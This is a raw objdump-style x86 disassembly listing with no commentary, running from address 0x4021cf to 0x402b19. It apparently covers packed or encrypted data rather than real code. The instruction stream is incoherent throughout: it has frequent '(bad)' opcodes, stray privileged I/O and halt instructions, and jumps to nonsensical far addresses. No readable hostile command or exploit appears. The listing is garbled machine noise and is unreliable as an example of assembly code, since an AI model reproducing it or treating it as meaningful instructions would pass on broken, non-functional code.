  4021cf:	inc    ebp
  4021d0:	in     al,0xe4
  4021d2:	ret    
  4021d3:	je     0x4021c2
  4021d5:	call   0x7b01a30
  4021da:	jmp    0xd21b5fbf
  4021df:	push   0xffffffbf
  4021e1:	pop    es
  4021e2:	jmp    0xa94ed173
  4021e7:	push   esi
  4021e8:	cld    
  4021e9:	test   DWORD PTR [esp+edi*8+0x0],eax
	...
  4021fd:	add    cl,dh
  4021ff:	push   ebp
  402200:	xlat   BYTE PTR ds:[ebx]
  402201:	mov    WORD PTR ds:0x873428ff,?
  402207:	push   esp
  402208:	aad    0xe0
  40220a:	add    eax,0xe456a5f7
  40220f:	fst    DWORD PTR [esp+ecx*1]
  402212:	pop    eax
  402213:	sub    BYTE PTR [esi-0x5fc59820],dl
  402219:	lds    eax,FWORD PTR [edi+eax*1]
  40221c:	sbb    al,0x8d
  40221e:	inc    esp
  40221f:	mov    ah,bh
  402221:	or     esi,ecx
  402223:	push   es
  402224:	jmp    0x6e4fdfac
  402229:	push   ss
  40222a:	int    0x2f
  40222c:	test   al,0x3
  40222e:	addr16 inc esp
  402230:	icebp  
  402231:	ins    DWORD PTR es:[edi],dx
  402232:	lock (bad) 
  402235:	mul    DWORD PTR [esi]
  402237:	push   esp
  402238:	stc    
  402239:	loopne 0x4021e0
  40223b:	or     al,BYTE PTR [esi+0x56]
  40223e:	call   0x10215831
  402243:	fisub  DWORD PTR [eax]
  402245:	(bad)
  402248:	add    al,ah
  40224a:	imul   esi,DWORD PTR [edi+0x1039e538],0xffffffe9
  402251:	add    esi,eax
  402253:	mov    bh,0x3
  402255:	push   esp
  402256:	hlt    
  402257:	xchg   DWORD PTR [ebx],ebx
  402259:	adc    al,BYTE PTR [edx-0x1d7dfa51]
  40225f:	not    edi
  402261:	repnz add BYTE PTR [eax],al
	...
  402274:	loopne 0x40225a
  402276:	add    BYTE PTR [edi],al
  402278:	jp     0x40226c
  40227a:	test   BYTE PTR [ecx+0x52],bh
  40227d:	dec    eax
  40227e:	add    bh,ah
  402280:	lods   al,BYTE PTR ds:[esi]
  402281:	push   ebx
  402282:	fisubr DWORD PTR [edx+0x3eec8de9]
  402288:	jnp    0x4022cd
  40228a:	or     dh,dl
  40228c:	lea    edi,fs:[ebp-0xb]
  402290:	push   0x4b
  402292:	adc    dl,dh
  402294:	mov    esp,0x3c621852
  402299:	(bad)  
  40229a:	jmp    0xeca6:0x2501e1e1
  4022a1:	push   es
  4022a2:	add    BYTE PTR [edx-0x8],dh
  4022a5:	xor    DWORD PTR [eax+0x8],0xffffffad
  4022a9:	push   es
  4022aa:	xor    ebp,DWORD PTR [ebx+0x7ee8e4b7]
  4022b0:	pushf  
  4022b1:	cmp    ecx,ecx
  4022b3:	stos   DWORD PTR es:[edi],eax
  4022b4:	loopne 0x4022bc
  4022b6:	push   ebp
  4022b7:	bound  eax,QWORD PTR [eax+0x35]
  4022ba:	sub    esp,0xffffffeb
  4022bd:	push   es
  4022be:	jne    0x4022ae
  4022c0:	cs inc ebx
  4022c2:	or     BYTE PTR [ecx-0x24],cl
  4022c5:	inc    edi
  4022c6:	add    BYTE PTR [edx-0x6f],ch
  4022c9:	or     al,BYTE PTR [eax]
  4022cb:	aam    0xf6
  4022cd:	rol    DWORD PTR [ebp-0xb],0x13
  4022d1:	cs inc ecx
  4022d3:	jmp    0x41487606
	...
  4022e8:	add    BYTE PTR [eax],al
  4022ea:	out    0xcb,eax
  4022ec:	add    cl,ch
  4022ee:	push   0xffffffbe
  4022f0:	call   FWORD PTR [edi+eiz*8-0xbd3ca12]
  4022f7:	push   es
  4022f8:	add    esi,DWORD PTR [ecx]
  4022fa:	xor    esi,DWORD PTR [eax+ebp*8]
  4022fd:	into   
  4022fe:	mov    edi,0x6200ffd8
  402303:	fwait
  402304:	push   DWORD PTR [ebp-0x3f]
  402307:	adc    eax,0x30c3fe8
  40230c:	add    bh,bh
  40230e:	inc    esp
  40230f:	or     BYTE PTR [ebx-0x18],dl
  402312:	or     eax,0x220000b6
  402317:	lds    ebx,FWORD PTR [ebx-0x37]
  40231a:	pop    ebx
  40231b:	or     al,0x0
  40231d:	push   ebp
  40231e:	adc    ch,al
  402320:	push   ebx
  402321:	sub    DWORD PTR [ebx+ecx*1],0x0
  402325:	jne    0x4022bd
  402327:	rol    DWORD PTR [ebp+0x8],0xb9
  40232b:	sub    al,0x41
  40232d:	add    BYTE PTR [edx],cl
  40232f:	addr16 or al,0x0
  402332:	aam    0xff
  402334:	mov    BYTE PTR [ebp+0x5d],0xe4
  402338:	sub    BYTE PTR [ecx+0x59],al
  40233b:	mov    ecx,0xed710875
  402340:	int3   
  402341:	add    BYTE PTR [ecx-0x73],cl
  402344:	fdivr  st,st(7)
  402346:	inc    esp
  402347:	or     al,ch
  402349:	loope  0x4022d8
  40234b:	add    al,0x0
  40234d:	add    eax,DWORD PTR [eax]
	...
  40235f:	add    BYTE PTR [ecx+0x45],ah
  402362:	push   ebx
  402363:	call   0x3fe00a
  402368:	mov    ds:0x1175ff9b,al
  40236d:	adc    eax,0x3fdebe8
  402372:	add    bh,bh
  402374:	push   esp
  402375:	or     BYTE PTR [ebx-0x18],dl
  402378:	mov    eax,ds:0xbe0000c7
  40237d:	ds or  al,ch
  402380:	cmp    DWORD PTR [edi+edi*8+0x5bc482ff],0xc1bc9
  40238b:	push   ebp
  40238c:	lock fs out dx,eax
  40238f:	xor    DWORD PTR [ecx+ecx*1-0x111297ca],0x3
  402397:	add    al,bl
  402399:	adc    dl,bl
  40239b:	inc    edi
  40239d:	dec    ax
  40239f:	cld    
  4023a0:	jae    0x40234c
  4023a2:	mov    gs,WORD PTR [ecx]
  4023a4:	xor    esi,ebp
  4023a6:	add    esi,DWORD PTR [ebp-0xe]
  4023a9:	mov    ah,0xf6
  4023ab:	(bad)  
  4023ac:	sbb    eax,0xa006ab2
  4023b1:	out    dx,al
  4023b2:	fdiv   QWORD PTR [ebp-0x18]
  4023b5:	xor    eax,DWORD PTR [edi+edi*8]
  4023b8:	in     eax,0x68
  4023ba:	sub    eax,DWORD PTR [ecx-0x10]
  4023bd:	push   0xffffffc4
  4023bf:	jns    0x4023e9
  4023c1:	test   eax,0xfc57
	...
  4023d6:	mov    cl,bh
  4023d8:	fdivr  st,st(7)
  4023da:	outs   dx,DWORD PTR ds:[esi]
  4023db:	mov    al,ds:0xedf0fc47
  4023e0:	add    eax,DWORD PTR [eax]
  4023e2:	lahf   
  4023e3:	pop    esp
  4023e4:	sub    eax,DWORD PTR [ecx-0x10]
  4023e7:	je     0x402418
  4023e9:	mov    esp,edi
  4023eb:	push   esp
  4023ec:	inc    edi
  4023ed:	or     BYTE PTR ds:0x3fff5d51,cl
  4023f3:	xchg   esi,eax
  4023f4:	inc    ecx
  4023f5:	add    al,0xbd
  4023f7:	add    al,0x6a
  4023f9:	add    BYTE PTR [ebp-0x55],bh
  4023fc:	or     edx,DWORD PTR [eax-0x68]
  4023ff:	adc    BYTE PTR [edx],ch
  402401:	inc    ecx
  402402:	lock dec eax
  402404:	adc    ch,al
  402406:	mov    ch,0x3f
  402408:	(bad)  
  40240a:	sti    
  40240b:	sub    eax,0xaa790558
  402410:	fucomip st,st(3)
  402412:	call   0x7344e983
  402417:	push   es
  402418:	out    0x3,al
  40241a:	lds    esi,FWORD PTR gs:[edx+0x47]
  40241e:	in     al,0x36
  402420:	and    dl,al
  402422:	hlt    
  402423:	push   es
  402424:	mov    ah,0x88
  402426:	les    edi,FWORD PTR [edx]
  402428:	jb     0x402471
  40242a:	clc    
  40242b:	add    DWORD PTR [ecx],ebp
  40242d:	pop    eax
  40242e:	in     eax,dx
  40242f:	xchg   BYTE PTR [ecx+0x31014503],dh
  402435:	add    al,0xf0
  402437:	push   es
  402438:	jmp    0x402475
	...
  402449:	add    BYTE PTR [eax],al
  40244b:	add    BYTE PTR [ecx+0x1a03e5c9],bh
  402451:	pop    es
  402452:	inc    ebx
  402453:	add    al,0xa
  402455:	or     al,BYTE PTR [ebx+0x4]
  402458:	or     al,BYTE PTR [edi]
  40245a:	push   ecx
  40245b:	test   al,dh
  40245d:	push   es
  40245e:	jmp    0xc13f223f
  402463:	in     al,0xab
  402465:	pop    es
  402466:	jmp    0xa962bcf3
  40246b:	inc    eax
  40246c:	in     al,0x1
  40246e:	cmp    ch,ah
  402470:	dec    esi
  402471:	ret    0x3e9
  402474:	cwde   
  402475:	or     cl,ch
  402477:	add    esi,eax
  402479:	xor    DWORD PTR [eax+0x1406f4c1],esi
  40247f:	mov    DWORD PTR [edx+eax*4+0x2c],edx
  402483:	or     al,0xeb
  402485:	(bad)  
  402486:	cmc    
  402487:	push   es
  402488:	jo     0x402499
  40248a:	jmp    0xe9cf1de5
  40248f:	add    esi,eax
  402491:	push   es
  402492:	and    cl,al
  402494:	hlt    
  402495:	push   es
  402496:	dec    esi
  402497:	push   esi
  402498:	call   0xf108607b
  40249d:	push   es
  40249e:	push   0xffffffdb
  4024a0:	pop    es
  4024a1:	pop    ebx
  4024a2:	add    ah,ah
  4024a4:	dec    edx
  4024a5:	idiv   edi
  4024a7:	call   0x29d52a9f
  4024ac:	cld    
  4024ad:	pushf  
  4024ae:	rcl    BYTE PTR [edx],0x0
	...
  4024c1:	add    dh,ch
  4024c3:	mov    es,WORD PTR [eax]
  4024c5:	jmp    0x2c092bbd
  4024ca:	out    dx,eax
  4024cb:	push   es
  4024cc:	push   ebp
  4024cd:	jb     0x4024ae
  4024cf:	mov    esp,eax
  4024d1:	std    
  4024d2:	pop    eax
  4024d3:	pop    es
  4024d4:	push   0xffffffe9
  4024d6:	pushf  
  4024d7:	pop    ebx
  4024d8:	or     BYTE PTR [ecx],al
  4024da:	test   al,0xc1
  4024dc:	add    cl,ch
  4024de:	inc    dh
  4024e0:	je     0x4024f5
  4024e2:	fdiv   QWORD PTR [esi]
  4024e4:	call   0x15e373
  4024e9:	pusha  
  4024ea:	xor    ebx,edx
  4024ec:	pop    eax
  4024ed:	sbb    DWORD PTR [ebx+0x21befc5b],ebp
  4024f3:	jmp    edi
  4024f5:	jns    0x4024a6
  4024f7:	push   es
  4024f8:	add    dl,ah
  4024fa:	mov    bl,0x5b
  4024fc:	or     al,0xa6
  4024fe:	rcl    edx,0xe8
  402501:	sbb    DWORD PTR [esi-0x2b],eax
  402504:	inc    edx
  402506:	xor    esp,ecx
  402508:	add    esp,DWORD PTR [edx-0x4f]
  40250b:	ror    cl,cl
  40250d:	stos   DWORD PTR es:[edi],eax
  40250e:	lock push es
  402510:	push   ebp
  402511:	jb     0x40256b
  402513:	cmp    DWORD PTR [ebx+0x1060e814],ecx
  402519:	sbb    al,BYTE PTR [edx+ecx*4-0x6]
  40251d:	dec    bx
  40251f:	pusha  
  402520:	add    bl,dl
  402522:	repz pusha 
  402524:	add    eax,ebx
	...
  402536:	add    BYTE PTR [eax],al
  402538:	repz pusha 
  40253a:	add    eax,ecx
  40253c:	repz push es
  40253e:	add    BYTE PTR [eax],al
  402540:	cdq    
  402541:	mov    cl,0x75
  402543:	or     BYTE PTR [ecx+0x900cb25],ah
  402549:	add    BYTE PTR [ebx],0x40
  40254c:	cmp    eax,0xa9006a1d
  402551:	loopne 0x4025bf
  402553:	retf   
  402554:	(bad)  [eax]
  402556:	mov    DWORD PTR [ebx-0x2b],eax
  402559:	bound  eax,QWORD PTR [eax]
  40255b:	push   0xffffffc9
  40255d:	bound  eax,QWORD PTR [eax]
  40255f:	push   0xffffffdb
  402561:	bound  eax,QWORD PTR [eax]
  402563:	dec    DWORD PTR [edx-0x3634a120]
  402569:	or     BYTE PTR [ebx],cl
  40256b:	sar    BYTE PTR ds:0x9d438921,0x62
  402572:	add    BYTE PTR [edx-0x67],ch
  402575:	bound  eax,QWORD PTR [eax]
  402577:	push   0xffffff8d
  402579:	sbb    al,ch
  40257b:	dec    edi
  40257c:	push   edx
  40257d:	or     BYTE PTR [eax],al
  40257f:	mov    edx,ebx
  402581:	add    cl,BYTE PTR [ebx]
  402583:	sar    BYTE PTR [esi+eiz*1-0x1f728c01],0xf2
  40258b:	retf   0x889
  40258e:	push   DWORD PTR [ebx]
  402590:	and    ebp,0xc95900ca
  402596:	add    edi,edi
  402598:	xchg   BYTE PTR [ecx+0xebff],dh
	...
  4025ae:	xor    al,0xb1
  4025b0:	xor    ebp,eax
  4025b2:	xchg   ebp,eax
  4025b3:	ret    0x0
  4025b6:	mov    cs,WORD PTR ds:0xb0c6ffff
  4025bc:	sub    eax,eax
  4025be:	or     BYTE PTR [ebp+0x8],0xf
  4025c2:	lods   al,BYTE PTR ds:[esi]
  4025c3:	(bad)  
  4025c4:	pop    ebx
  4025c5:	leave  
  4025c6:	(bad)  
  4025c8:	call   DWORD PTR [eax+esi*8+0x68]
  4025cc:	out    0x53,eax
  4025ce:	imul   esp,DWORD PTR [ebx+0x4ccb830b],0x4f
  4025d5:	pop    ss
  4025d6:	pop    es
  4025d7:	xchg   ecx,eax
  4025d8:	or     ebp,eax
  4025da:	jmp    0xf7402907
  4025df:	nop
  4025e0:	jmp    edi
  4025e2:	popf   
  4025e3:	pop    ss
  4025e4:	add    eax,DWORD PTR [eax]
  4025e6:	out    0xb0,eax
  4025e8:	jmp    0x402590
  4025ea:	stos   BYTE PTR es:[edi],al
  4025eb:	fld    QWORD PTR [ebx]
  4025ed:	pop    ebx
  4025ee:	test   eax,0x24ffff1f
  4025f3:	pop    ecx
  4025f4:	out    0x81,eax
  4025f6:	lods   al,BYTE PTR ds:[esi]
  4025f7:	std    
  4025f8:	jmp    0x32b3e5fc
  4025fd:	xor    ebp,0x6b
  402600:	sub    eax,DWORD PTR [ecx-0x10]
  402603:	fisttp QWORD PTR [edi+0x15]
  402606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402607:	cli    
  402608:	sub    DWORD PTR [eax],0x8aebde31
  40260e:	cdq    
  40260f:	(bad)  
  402610:	fld    st(7)
	...
  402622:	add    BYTE PTR [eax],al
  402624:	cmc    
  402625:	arpl   WORD PTR [ecx+eax*2],bp
  402628:	lock fld QWORD PTR [ebx]
  40262b:	add    al,dh
  40262d:	pusha  
  40262e:	pop    ss
  40262f:	mov    cl,al
  402631:	push   ds
  402632:	add    al,0x0
  402634:	in     al,0xd2
  402636:	fdiv   DWORD PTR ds:0x42b57a
  40263c:	dec    eax
  40263d:	or     ebx,ebx
  40263f:	call   DWORD PTR [edi-0x54]
  402642:	dec    DWORD PTR [ecx+0x41f18]
  402648:	lock fld QWORD PTR [ebx]
  40264b:	lea    esi,[ebp+0x4d]
  40264e:	jmp    0xec2d5e52
  402653:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402654:	and    BYTE PTR [esi],al
  402656:	fnstenvw [ebp-0x77]
  40265a:	dec    ebp
  40265b:	jmp    0xebf9f97f
  402660:	jp     0x402638
  402662:	dec    esi
  402663:	fnstcw WORD PTR [ebp+0x49]
  402666:	inc    ebp
  402667:	xor    al,0x98
  402669:	test   BYTE PTR [ecx],dl
  40266b:	inc    ebx
  40266c:	lock pop esi
  40266e:	jmp    0x402673
  402670:	lock xchg BYTE PTR [ecx+0x71],al
  402674:	mov    ebx,0xb00ce907
  402679:	add    ah,BYTE PTR [ebp+edi*1-0xf]
  40267d:	push   es
  40267e:	jmp    0xff1b9443
  402683:	fmul   st,st(7)
  402685:	pop    es
  402686:	jmp    0x40268e
	...
  402697:	add    BYTE PTR [eax],al
  402699:	add    al,dh
  40269b:	leave  
  40269c:	fs fmul st(7),st
  40269f:	shl    dh,cl
  4026a1:	fsub   st,st(7)
  4026a3:	push   es
  4026a4:	jmp    0xe99d1716
  4026a9:	ins    DWORD PTR es:[edi],dx
  4026aa:	lock pop esp
  4026ac:	jmp    0xc70f9c37
  4026b1:	fcom   DWORD PTR [edi-0x7381a3c9]
  4026b7:	loop   0x40267f
  4026b9:	fsub   DWORD PTR [eax]
  4026bb:	shl    BYTE PTR [edi+ecx*8-0x71],cl
  4026bf:	shl    BYTE PTR [esi-0x3e2d0228],cl
  4026c5:	cmp    eax,DWORD PTR ss:[edi]
  4026c8:	jmp    0x644256d9
  4026cd:	hlt    
  4026ce:	lock push es
  4026d0:	jmp    0x285f5d40
  4026d5:	add    al,0xd8
  4026d7:	adc    cl,0x42
  4026da:	lock fdivp st(6),st
  4026dd:	xlat   BYTE PTR ds:[ebx]
  4026de:	aas    
  4026df:	rol    BYTE PTR [eax],cl
  4026e1:	loop   0x402716
  4026e3:	add    al,BYTE PTR [eax+edi*2+0x720006f3]
  4026ea:	arpl   WORD PTR [ebp+eax*4-0x2df7a3],ax
  4026f1:	mov    ecx,0x4dbcdedd
  4026f6:	sub    dl,dl
  4026f8:	or     ebp,DWORD PTR [ecx]
  4026fa:	clc    
  4026fb:	mov    bl,dl
  4026fd:	jmp    0x402702
	...
  40270e:	add    BYTE PTR [eax],al
  402710:	repz push es
  402712:	mov    DWORD PTR [ebx+edx*1-0x1e],ebp
  402716:	jmp    FWORD PTR [esi]
  402718:	jbe    0x4026a5
  40271a:	call   0x5111ef35
  40271f:	xchg   ecx,eax
  402720:	mov    ch,0x1e
  402722:	inc    ecx
  402723:	jmp    0xff20c2e0
  402728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402729:	shr    DWORD PTR [eax-0x15],1
  40272c:	repz push es
  40272e:	adc    BYTE PTR [ecx],0x60
  402731:	int    0xff
  402733:	imul   bl
  402735:	(bad)  
  402736:	pcmpgtw mm1,QWORD PTR [esi+0x72e90006]
  40273d:	into   
  40273e:	add    esi,ebp
  402740:	sbb    eax,0xf3e90073
  402745:	call   DWORD PTR ss:[esp+ebx*4-0x4339001f]
  40274d:	shl    DWORD PTR [ebp-0x2e6847],1
  402753:	shl    DWORD PTR [ebp-0x26],0xff
  402757:	scas   al,BYTE PTR es:[edi]
  402758:	jns    0x4026e5
  40275a:	call   0x511166f5
  40275f:	adc    DWORD PTR [edx+0x3ee9411e],esp
  402765:	fwait
  402766:	loopne 0x4027e6
  402768:	daa    
  402769:	shr    DWORD PTR [eax+0x0],1
  40276c:	pop    ebx
  40276d:	add    eax,0x41618000
  402772:	sti    
  402773:	inc    DWORD PTR [eax]
	...
  402785:	add    BYTE PTR [esi-0x2a8b4003],bh
  40278b:	test   DWORD PTR [ebp-0x464118],edi
  402791:	add    DWORD PTR [edi-0x14],eax
  402794:	dec    edi
  402795:	push   eax
  402796:	mov    WORD PTR [edi-0x46411004],es
  40279c:	push   eax
  40279d:	call   0x40e9e3
  4027a2:	pop    ecx
  4027a3:	jle    0x40272a
  4027a5:	cld    
  4027a6:	scas   al,BYTE PTR es:[edi]
  4027a7:	mov    ecx,0x761e50ff
  4027ac:	in     al,dx
  4027ad:	out    dx,eax
  4027ae:	push   cs
  4027af:	mov    eax,0xb805cfe8
  4027b4:	call   FWORD PTR [eax-0x2]
  4027b7:	jne    0x4027a1
  4027b9:	out    dx,eax
  4027ba:	(bad)  
  4027bb:	mov    bh,0x50
  4027bd:	inc    DWORD PTR [edi+ebx*8]
  4027c0:	out    dx,eax
  4027c1:	(bad)  
  4027c2:	mov    esi,0xbef4bcdc
  4027c7:	mov    ecx,0xb9a119e8
  4027cc:	(bad)  
  4027cd:	jmp    0x4027c8
  4027cf:	jge    0x402756
  4027d1:	cld    
  4027d2:	scas   al,BYTE PTR es:[edi]
  4027d3:	mov    ecx,0x9b150ff
  4027d8:	leave  
  4027d9:	add    BYTE PTR [ecx+0x148d5044],bl
  4027df:	mov    eax,0x143effef
  4027e4:	push   DWORD PTR [ebp-0x1653]
	...
  4027fa:	add    BYTE PTR [eax],al
  4027fc:	xor    DWORD PTR [edi-0xc],edx
  4027ff:	dec    DWORD PTR [esi+0x7ef7f2dc]
  402805:	mov    ecx,0x7df0b5ff
  40280a:	out    0xff,al
  40280c:	dec    edi
  40280d:	xchg   dh,bl
  40280f:	test   DWORD PTR [edi-0x77],0x814485d6
  402816:	(bad)  
  402817:	dec    DWORD PTR [ecx+0x11]
  40281a:	aad    0xff
  40281c:	das    
  40281d:	popa   
  40281e:	push   eax
  40281f:	cld    
  402820:	sbb    al,bh
  402822:	leave  
  402823:	add    al,dh
  402825:	mov    bl,0x3
  402827:	call   FWORD PTR [ebp+0x2e]
  40282a:	out    0xff,al
  40282c:	cmovbe esi,DWORD PTR [ebx]
  40282f:	hlt    
  402830:	pop    es
  402831:	dec    ecx
  402832:	imul   eax,DWORD PTR [eax],0xefe75aff
  402838:	neg    DWORD PTR [eax]
  40283a:	jmp    0x40287f
  40283c:	in     al,0x20
  40283e:	(bad)  
  40283f:	lea    ebp,[ebp+0x1]
  402842:	out    0xff,al
  402844:	fisttp WORD PTR [ebp+0x8e0b5d6]
  40284a:	(bad)  
  40284b:	(bad)  
  40284c:	fmul   DWORD PTR [ebx]
  40284e:	int3   
  40284f:	add    al,dh
  402851:	(bad)  
  402853:	js     0x402880
  402855:	ror    DWORD PTR [edi-0x2a273810],1
  40285b:	call   0x15f9af
	...
  402870:	add    BYTE PTR [eax],al
  402872:	jns    0x4028d6
  402874:	in     al,dx
  402875:	out    dx,eax
  402876:	lahf   
  402877:	mov    al,0xd5
  402879:	mov    ch,0x88
  40287b:	enter  0xffd5,0x98
  40287f:	pusha  
  402880:	int    0xff
  402882:	xchg   DWORD PTR [esi+edi*2+0x28],edi
  402886:	xor    esi,ebx
  402888:	aam    0xb5
  40288a:	mov    eax,cs
  40288c:	aad    0xff
  40288e:	pop    eax
  40288f:	pop    ebx
  402890:	int3   
  402891:	add    al,dh
  402893:	push   es
  402894:	bnd ret 
  402896:	in     al,0xeb
  402898:	jno    0x402821
  40289a:	dec    eax
  40289b:	fist   WORD PTR [esi+0x62d67bd5]
  4028a1:	pop    ss
  4028a2:	outs   dx,BYTE PTR ds:[esi]
  4028a3:	push   ds
  4028a4:	sub    BYTE PTR [ebx+eax*2],al
  4028a7:	stos   BYTE PTR es:[edi],al
  4028a8:	jle    0x402839
  4028aa:	dec    esp
  4028ab:	fbstp  TBYTE PTR [esi-0x2b]
  4028ae:	sbb    BYTE PTR [ebp-0x5f],bl
  4028b1:	add    al,0xf0
  4028b3:	sub    DWORD PTR [eax+eiz*8+0xf],0x17345ecf
  4028bb:	cdq    
  4028bc:	inc    ebp
  4028bd:	in     eax,0xf
  4028bf:	iret   
  4028c0:	inc    ecx
  4028c1:	push   ebx
  4028c2:	cmp    DWORD PTR [esi],eax
  4028c4:	jmp    0xb28e5947
  4028c9:	aam    0x3d
  4028cb:	loop   0x402913
  4028cd:	aad    0xef
  4028cf:	fild   QWORD PTR [edi]
  4028d1:	out    0xe7,al
  4028d3:	into   
  4028d4:	jo     0x402955
	...
  4028e6:	add    BYTE PTR [eax],al
  4028e8:	enter  0x1ede,0xd5
  4028ec:	xlat   BYTE PTR ds:[ebx]
  4028ed:	xchg   esp,eax
  4028ee:	add    ebp,esp
  4028f0:	iret   
  4028f1:	into   
  4028f2:	add    DWORD PTR [esi],edx
  4028f4:	mov    edi,0x6aa106ce
  4028f9:	pop    ds
  4028fa:	test   al,0x3
  4028fc:	mov    bh,0x94
  4028fe:	or     eax,0x1ceafe5
  402903:	and    edi,DWORD PTR [eax-0x4ff716f9]
  402909:	push   ebx
  40290a:	add    cl,BYTE PTR [ecx-0x2b39209b]
  402910:	pop    DWORD PTR [edx-0x7f3a7727]
  402916:	adc    DWORD PTR [ebx-0x10],eax
  402919:	fld    DWORD PTR [ebp+0xe33dd4]
  40291f:	mov    BYTE PTR [esi+ecx*8-0x18],0xe1
  402924:	cmp    eax,DWORD PTR [edi]
  402926:	add    BYTE PTR [esi-0x61102892],ah
  40292c:	cmp    al,0xdf
  40292e:	pop    edx
  40292f:	xchg   DWORD PTR [esi+ecx*8],esp
  402932:	call   DWORD PTR [edi+ecx*2-0x22]
  402936:	inc    DWORD PTR [esi+0x7eee3e4b]
  40293c:	sbb    al,0x2e
  40293e:	pop    esi
  40293f:	mov    al,ds:0x7d8b3430
  402944:	cdq    
  402945:	(bad)  
  402946:	out    0x52,eax
  402948:	sub    eax,0x72ffce
	...
  40295d:	add    BYTE PTR [ebx-0x32],ah
  402960:	xor    eax,0x47db4d
  402965:	pop    esi
  402966:	icebp  
  402967:	int    0x75
  402969:	icebp  
  40296a:	je     0x4029b5
  40296c:	add    al,0x70
  40296e:	push   es
  40296f:	jmp    0xe5c2:0xbff3a828
  402976:	repz xor ecx,DWORD PTR [ebx-0x73d8feb]
  40297d:	mov    dh,0x94
  40297f:	inc    ebx
  402980:	clc    
  402981:	jmp    0x6a403079
  402986:	push   ds
  402987:	(bad)  
  402988:	(bad)  
  402989:	jl     0x40294c
  40298b:	int3   
  40298c:	jne    0x40297b
  40298e:	pushf  
  40298f:	push   ebx
  402990:	or     BYTE PTR [ebx-0xcf9210d],al
  402996:	ret    
  402997:	int    0x89
  402999:	sub    al,0xc0
  40299b:	loope  0x4029a4
  40299d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40299e:	sub    ebx,ecx
  4029a0:	add    cl,ch
  4029a2:	repz push es
  4029a4:	mov    ecx,DWORD PTR [eax+ebx*4]
  4029a7:	push   ds
  4029a8:	inc    ecx
  4029a9:	add    BYTE PTR [ecx-0x3374ec54],cl
  4029af:	mov    dh,0x3b
  4029b1:	inc    edi
  4029b2:	pop    ebp
  4029b3:	cs or  edi,eax
  4029b6:	or     al,0xbb
  4029b8:	add    DWORD PTR [eax],eax
  4029ba:	dec    ecx
  4029bb:	or     ebx,ebp
  4029bd:	push   es
  4029be:	loop   0x4029b9
  4029c0:	or     bh,bh
	...
  4029d2:	add    BYTE PTR [eax],al
  4029d4:	in     al,dx
  4029d5:	stos   DWORD PTR es:[edi],eax
  4029d6:	cmp    DWORD PTR [ebp+0x61],0x2
  4029da:	jne    0x4029e4
  4029dc:	jbe    0x402a0d
  4029de:	cld    
  4029df:	call   0x3fe3af
  4029e4:	xchg   edx,eax
  4029e5:	aas    
  4029e6:	clc    
  4029e7:	pop    edi
  4029e8:	push   eax
  4029e9:	les    ecx,FWORD PTR [eax]
  4029eb:	add    BYTE PTR [esi+0x4c],bl
  4029ee:	cmp    eax,0x4401e4
  4029f3:	jmp    0x402a06
  4029f5:	adc    BYTE PTR [ebx-0x9be4ec1],cl
  4029fb:	push   DWORD PTR [esi-0x428a0133]
  402a01:	rol    DWORD PTR ds:0x41f1e4,0x0
  402a08:	(bad)  [eax]
  402a0a:	add    BYTE PTR [edi+0xa],bl
  402a0d:	push   cs
  402a0e:	mov    ebp,esp
  402a10:	sahf   
  402a11:	push   cs
  402a12:	push   0x0
  402a14:	out    0x2d,al
  402a16:	or     al,ch
  402a18:	push   cs
  402a19:	mov    edx,0xbb42ffff
  402a1e:	push   DWORD PTR [ebp-0x3f]
  402a21:	mov    al,0x22
  402a23:	(bad)  
  402a24:	cdq    
  402a25:	or     BYTE PTR [ebx+0xf2e98f8],al
  402a2b:	push   edi
  402a2c:	or     ecx,edi
  402a2e:	and    DWORD PTR [ebp-0x5f],esi
  402a31:	mov    esp,0xdef0778d
  402a36:	jle    0x402a00
	...
  402a48:	add    BYTE PTR [eax],al
  402a4a:	add    DWORD PTR [edx-0x8dc97ce],0x44
  402a51:	add    BYTE PTR [edi],bl
  402a53:	mov    dh,0x6e
  402a55:	enter  0xddf0,0xfe
  402a59:	mov    edi,0x40c9e1dc
  402a5e:	hlt    
  402a5f:	fstp   QWORD PTR [ebp+0x5c]
  402a62:	retf   0x3add
  402a65:	call   0x43d0e9
  402a6a:	sti    
  402a6b:	popf   
  402a6c:	push   edi
  402a6d:	add    eax,0xeb03de36
  402a72:	repz mov ds:0x85c7000a,eax
  402a78:	mov    dl,0xc6
  402a7a:	lock fld QWORD PTR [esi+0x6acf3f8]
  402a81:	(bad)  
  402a82:	out    dx,eax
  402a83:	fnstsw WORD PTR [esi-0x39]
  402a86:	scas   al,BYTE PTR es:[edi]
  402a87:	xchg   esp,eax
  402a88:	mov    esp,0x38ddecc2
  402a8d:	mov    ecx,DWORD PTR [ecx+eiz*2]
  402a90:	(bad)  
  402a91:	cld    
  402a92:	imul   esp,DWORD PTR [ebx-0x520ffb01],0x3
  402a99:	add    BYTE PTR [eax+0x46],al
  402a9c:	shl    ebp,0xdf
  402a9f:	and    al,0x7c
  402aa1:	inc    ebp
  402aa2:	aam    0xec
  402aa4:	push   edi
  402aa5:	or     al,0xcf
  402aa7:	push   0xffffffcf
  402aa9:	(bad)  
  402aaa:	cmp    eax,0xf4dbe6
	...
  402abf:	add    ch,al
  402ac1:	add    al,0xd2
  402ac3:	(bad)  
  402ac4:	cmp    eax,0xfc75d2ae
  402ac9:	aam    0x57
  402acb:	cld    
  402acc:	cwde   
  402acd:	or     BYTE PTR gs:[eax],al
  402ad0:	lock push es
  402ad2:	out    0x57,al
  402ad4:	xchg   esp,eax
  402ad5:	fidivr WORD PTR [ecx-0x29]
  402ad8:	(bad)  
  402ad9:	retf   
  402ada:	mov    al,ds:0x3a06f4c6
  402adf:	pop    esp
  402ae0:	rcr    BYTE PTR ds:0xb7880428,0xa7
  402ae7:	add    al,0xf0
  402ae9:	jmp    FWORD PTR [eax-0x6e7ffda8]
  402aef:	pop    esp
  402af0:	sbb    al,0x1e
  402af2:	sub    BYTE PTR [ebx+eax*8],al
  402af5:	fidiv  WORD PTR [ecx+0x4a06f0ca]
  402afb:	inc    ecx
  402afc:	sbb    DWORD PTR [esi-0x17],eax
  402aff:	sub    al,0x33
  402b01:	xor    DWORD PTR [edx-0x20],esi
  402b04:	sahf   
  402b05:	aaa    
  402b06:	push   ss
  402b07:	shl    DWORD PTR [ebp+0x2e9f80fe],1
  402b0d:	push   es
  402b0e:	jmp    0xdd071686
  402b13:	or     BYTE PTR [edi+0x32babf2f],dh
  402b19:	(bad)  
